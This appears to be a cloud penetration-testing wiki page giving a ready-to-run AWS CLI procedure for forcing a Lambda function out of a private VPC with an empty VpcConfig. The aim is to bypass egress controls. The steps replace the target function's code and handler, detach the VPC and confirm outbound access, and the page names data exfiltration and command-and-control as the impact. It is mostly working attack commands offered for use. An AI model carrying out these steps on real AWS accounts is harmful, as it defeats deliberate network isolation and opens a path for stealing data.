# AWS Lambda – VPC Egress Bypass by Detaching VpcConfig

Force a Lambda function out of a restricted VPC by updating its configuration with an empty VpcConfig (SubnetIds=[], SecurityGroupIds=[]). The function will then run in the Lambda-managed networking plane, regaining outbound internet access and bypassing egress controls enforced by private VPC subnets without NAT.

## Abusing it

- Pre-reqs: lambda:UpdateFunctionConfiguration on the target function (and lambda:InvokeFunction to validate), plus permissions to update code/handler if changing them.
- Assumptions: The function is currently configured with VpcConfig pointing to private subnets without NAT (so outbound internet is blocked).
- Region: us-east-1

### Steps

0) Prepare a minimal handler that proves outbound HTTP works

    cat > net.py <<'PY'
    import urllib.request, json
    
    def lambda_handler(event, context):
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=3).read().decode().strip()
            return {"egress": True, "ip": ip}
        except Exception as e:
            return {"egress": False, "err": str(e)}
    PY
    zip net.zip net.py
    aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://net.zip --region $REGION || true
    aws lambda update-function-configuration --function-name $TARGET_FN --handler net.lambda_handler --region $REGION || true

1) Record current VPC config (to restore later if needed)

    aws lambda get-function-configuration --function-name $TARGET_FN --query 'VpcConfig' --region $REGION > /tmp/orig-vpc.json
    cat /tmp/orig-vpc.json

2) Detach the VPC by setting empty lists

    aws lambda update-function-configuration \
      --function-name $TARGET_FN \
      --vpc-config SubnetIds=[],SecurityGroupIds=[] \
      --region $REGION
    until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done

3) Invoke and verify outbound access

    aws lambda invoke --function-name $TARGET_FN /tmp/net-out.json --region $REGION >/dev/null
    cat /tmp/net-out.json

(Optional) Restore original VPC config

    if jq -e '.SubnetIds | length > 0' /tmp/orig-vpc.json >/dev/null; then
      SUBS=$(jq -r '.SubnetIds | join(",")' /tmp/orig-vpc.json); SGS=$(jq -r '.SecurityGroupIds | join(",")' /tmp/orig-vpc.json)
      aws lambda update-function-configuration --function-name $TARGET_FN --vpc-config SubnetIds=[$SUBS],SecurityGroupIds=[$SGS] --region $REGION
    fi

### Impact
- Regains unrestricted outbound internet from the function, enabling data exfiltration or C2 from workloads that were intentionally isolated in private subnets without NAT.

### Example output (after detaching VpcConfig)

    {"egress": true, "ip": "34.x.x.x"}

### Cleanup
- If you created any temporary code/handler changes, restore them.
- Optionally restore the original VpcConfig saved in /tmp/orig-vpc.json as shown above.
